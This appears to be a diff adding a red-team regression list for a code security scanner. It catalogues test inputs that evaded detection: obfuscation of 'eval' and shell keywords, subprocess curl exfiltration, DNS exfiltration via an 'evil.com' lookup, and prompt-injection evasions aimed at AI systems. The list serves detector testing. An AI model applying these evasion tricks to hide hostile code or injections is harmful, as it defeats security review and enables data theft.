@@ -1,0 +1,62 @@
+# Red-Team Regression Candidates — 2026-03-17 Full Scanner
+# 43 inputs evaded detection entirely (zero findings)
+# Severity: must-fix (critical/high evasion rate), should-fix (medium/low)
+
+## MUST-FIX — Critical evasion rate (>50%)
+
+### Split-evasion resolver gaps (23 evasions, 96% rate)
+split-kwargs-evasion/split_nested_dict.py          # nested dict subscript d['a']['b']
+split-kwargs-evasion/split_list_index.py            # list integer index parts[0]+parts[1]
+split-kwargs-evasion/split_format_keywords.py       # '{x}'.format(x='eval')
+split-kwargs-evasion/split_fstring_method.py        # f'{obj.method()}' call in f-string
+split-kwargs-evasion/split_generator_complex.py     # sorted(dict.keys()) in comprehension
+split-kwargs-evasion/split_reduce_custom.py         # reduce(named_func, [...])
+split-kwargs-evasion/split_bytes_xor.py             # chr(b ^ key) XOR decoding
+split-kwargs-evasion/split_slice_variable.py        # s[start:end] with variable bounds
+split-kwargs-evasion/split_reverse.py               # s[::-1] string reversal
+split-kwargs-evasion/split_multi_assign.py          # a = b = 'eval' multi-target
+split-kwargs-evasion/split_join_set.py              # ''.join(set_literal)
+split-kwargs-evasion/split_join_star_unpack.py      # ''.join([*a, *b]) star unpack
+split-kwargs-evasion/split_map_lambda.py            # map(lambda c: chr(c), [...])
+split-kwargs-evasion/split_class_level.py           # class-level int-list (DEBT-028)
+split-kwargs-evasion/split_intlist_concat.py        # int-list concat via + (DEBT-027)
+split-kwargs-evasion/split_intlist_extend_var.py    # extend(tracked_var) (DEBT-027)
+split-kwargs-evasion/split_intlist_branch.py        # int-list in if/else (DEBT-028)
+
+### Kwargs detector gaps (6 evasions, 100% rate)
+split-kwargs-evasion/kwargs_spread.py               # {**base, 'shell': True} PEP 448
+split-kwargs-evasion/kwargs_dynamic_key.py          # variable dict key
+split-kwargs-evasion/kwargs_method_chain.py         # dict.update() chain
+split-kwargs-evasion/kwargs_conditional.py          # runtime conditional value
+split-kwargs-evasion/kwargs_nested_func.py          # dict from function return
+split-kwargs-evasion/kwargs_class_dict.py           # dict from class attribute
+
+## MUST-FIX — High evasion rate (25-50%)
+
+### Code execution evasion (9 evasions, 45% rate)
+exec-evasion/string_method_evasion.py               # 'EVAL'.lower() — trivial bypass
+exec-evasion/loop_assembly.py                       # for c in chars: name += c
+exec-evasion/format_map_evasion.py                  # str.format_map(dict)
+exec-evasion/dict_pop_evasion.py                    # dict.pop('key') extraction
+exec-evasion/star_import_evasion.py                 # from os import *; system()
+exec-evasion/try_except_evasion.py                  # import alias in try/except block
+exec-evasion/classvar_assembly.py                   # class-level BinOp (Config.prefix + suffix)
+exec-evasion/nested_comprehension.py                # nested for-clause in comprehension
+exec-evasion/bytes_xor_evasion.py                   # chr(b ^ key) XOR assembly
+
+### Exfil + obfuscation + decoder (7 evasions, 35% rate)
+exfil-obfs-evasion/exfil_subprocess_curl.py         # subprocess(['curl', '-d', data, url])
+exfil-obfs-evasion/exfil_dns_txt.py                 # getaddrinfo(f'{chunk}.evil.com', 80)
+exfil-obfs-evasion/obfs_rot13_custom.py             # manual chr/ord ROT13 cipher
+exfil-obfs-evasion/obfs_hex_split.py                # short hex fragments + bytes concat
+exfil-obfs-evasion/obfs_string_mult_assembly.py     # string slice base[:4] -> 'eval'
+exfil-obfs-evasion/decoder_hex_spaced.py            # hex with tab/newline separators
+exfil-obfs-evasion/decoder_mixed_encoding.py        # cross-encoding concat (hex+base64)
+
+## SHOULD-FIX — Medium evasion rate (10-25%)
+
+### Prompt injection evasion (4 evasions, 25% rate)
+pi-evasion/docs/guide.md                            # multi-line split injection
+pi-evasion/docs/changelog.md                        # semantic equivalent / synonym
+pi-evasion/docs/fullwidth.md                        # fullwidth Unicode characters
+pi-evasion/data/prompts.txt                         # indirect reference injection
